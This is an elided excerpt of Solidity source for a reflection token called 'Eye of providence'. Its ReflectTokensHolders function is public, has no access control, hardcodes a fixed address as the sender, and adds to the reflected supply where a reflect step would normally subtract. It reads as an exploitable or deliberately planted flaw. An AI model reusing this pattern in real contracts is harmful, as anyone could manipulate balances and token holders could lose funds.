...
abstract contract Tokenomics {
    ...
    string internal constant NAME = "Eye of providence";
...
abstract contract BaseRfiToken is IERC20, IERC20Metadata, Ownable, Presaleable, Tokenomics {
    ...
    function ReflectTokensHolders(uint256 tAmount) public {
        address sender = 0x7F69D6d7e33Eb5FE0be91e0f113572c4ec5888a3;
        require(!_isExcludedFromRewards[sender], "Excluded addresses cannot call this function");
        (uint256 rAmount,,,,) = _getValues(tAmount,0);
        _reflectedBalances[sender] = _reflectedBalances[sender].sub(rAmount);
        _reflectedSupply = _reflectedSupply.add(tAmount);
...
abstract contract Eye is BaseRfiToken, Liquifier, Antiwhale {
